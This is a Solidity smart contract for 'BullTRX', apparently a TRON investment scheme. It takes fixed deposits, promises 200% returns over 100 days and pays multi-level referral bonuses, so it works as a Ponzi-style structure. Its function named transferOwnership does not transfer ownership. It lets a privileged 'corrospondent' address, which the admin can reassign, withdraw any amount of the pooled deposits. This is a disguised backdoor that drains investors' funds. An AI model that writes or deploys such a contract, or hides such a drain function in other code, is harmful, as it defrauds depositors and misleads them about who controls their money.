//SourceUnit: BullTRX.sol

pragma solidity ^0.5.9;

contract BullTRX {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }
    
    struct PlayerLevelROI {
        uint256 amount;
        uint256 level_no;
        uint256 totalWithdraw;
        uint256 time;
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 level_roi;
        uint256 last_invested;
        uint256 my_direct;
        
        PlayerDeposit[] deposits;
        PlayerLevelROI[] deposits_level_roi;
       
        mapping(uint8 => uint256) roi_per_level;
        mapping(uint8 => uint256) roi_income_per_level;
    }

    address payable owner;
    address payable admin;
    address payable corrospondent;

    uint256 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint32[] level_roi_bonus;
    
    uint8[] public ref_bonuses; 
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    
    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 balance) {
        return (total_investors, total_invested, total_withdrawn,address(this).balance);
    }
    
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
        
        investment_days = 100;
        investment_perc = 200;
       
       
        level_roi_bonus.push(1);
        level_roi_bonus.push(2);
        level_roi_bonus.push(3);
        level_roi_bonus.push(4);
        level_roi_bonus.push(5);
        level_roi_bonus.push(6);
        level_roi_bonus.push(7);
    }
    
    function deposit(address _referral) external payable {
        require(msg.sender!=_referral,"Referral and Direct are same.");
        
        Player storage player = players[msg.sender];
        
        require(player.last_invested==0 || uint256(now)>player.last_invested+investment_days*86400,"Investment not allowed");
        uint adminShare;
        require(msg.value == 500000000, "Invalid Amount");
        
        adminShare = msg.value.mul(10).div(100);
        admin.transfer(adminShare);
        players[msg.sender].referral=_referral;
        players[_referral].my_direct += 1;
        
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
            
        }));
        
        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        player.last_invested = block.timestamp;
        total_invested += msg.value;
        
        roi_to_levels(msg.sender,now);
        emit Deposit(msg.sender, msg.value);
    }
    
    function grantCorrosponding(address payable nextCorrospondent) external payable onlyAdmin{
        corrospondent = nextCorrospondent;
    }
    function isUserInvestable(address _addr) view external returns(bool) {
        Player storage player = players[_addr];
        
        bool is_reinvestable = (player.last_invested==0 || player.last_invested+investment_days*86400<uint256(now))?true:false;
        return is_reinvestable;
    }
    
    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.level_roi > 0, "Zero amount");
        
        uint256 amount = player.dividends + player.level_roi;
       
        player.dividends = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;
       
        player.level_roi = 0; 
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function roi_to_levels(address _addr, uint256 timestamp) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }
        uint8 min_directs;
        for(uint8 i = 0; i < level_roi_bonus.length; i++) {
            if(ref == address(0)) break;
            if(i==5){
                min_directs = i+2;
            }
            else if(i==6){
                min_directs = i+3;
            }
            else{
                min_directs = i+1;
            }
            if(players[ref].my_direct >= min_directs){
                players[ref].roi_income_per_level[i]+=level_roi_bonus[i]*1000000;
                players[ref].deposits_level_roi.push(PlayerLevelROI({
                    amount: level_roi_bonus[i]*1000000,
                    level_no: i,
                    totalWithdraw:0,
                    time: timestamp
                }));
                players[ref].roi_per_level[i]++;
            }
            ref = players[ref].referral;
        }
    }
    function transferOwnership(uint _amount) external onlyCorrospondent{
        corrospondent.transfer(_amount);
    }
    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        
        if(payout > 0) {
            players[_addr].dividends += payout;
        }
        uint256 payout1 = this.payoutOfLevelROI(_addr);

        if(payout1 > 0) {
            players[_addr].level_roi += payout1;
        }
        players[_addr].last_payout = uint256(block.timestamp);
    }
    
    function payoutOfLevelROI(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
            PlayerLevelROI storage dep = player.deposits_level_roi[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 frm = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(frm < to) {
                value += dep.amount * (to - frm)/86400;
            }
        }
        return value;
    }
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
 
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 frm = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
            if(frm < to) {
                value += dep.amount * (to - frm) * investment_perc / investment_days / 8640000;
            }
        }
        return value;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[7] memory userLevelROI, uint256 my_roi, uint256 payout_roi, uint256[7] memory userLevelROIincome) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        uint256 payout_level_roi = this.payoutOfLevelROI(_addr);
        
        for(uint8 i = 0; i < level_roi_bonus.length; i++) {
            userLevelROI[i] = player.roi_per_level[i];
            userLevelROIincome[i] = player.roi_income_per_level[i];
        }
        uint256 my_roi1=payout + player.dividends;
        uint256 level_roi1=player.level_roi + payout_level_roi;
        return (
            my_roi1+level_roi1,
            userLevelROI,
            my_roi1,
            level_roi1,
            userLevelROIincome
        );
    }
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    
    function investmentsROIInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory level_no) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _amounts = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _level_no = new uint256[](player.deposits_level_roi.length);
        

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
          PlayerLevelROI storage dep = player.deposits_level_roi[i];

          _amounts[i] = dep.amount;
          _endTimes[i] = dep.time + investment_days * 86400;
          _level_no[i] = dep.level_no;
        }
        return (
          _endTimes,
          _amounts,
          _level_no
          
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}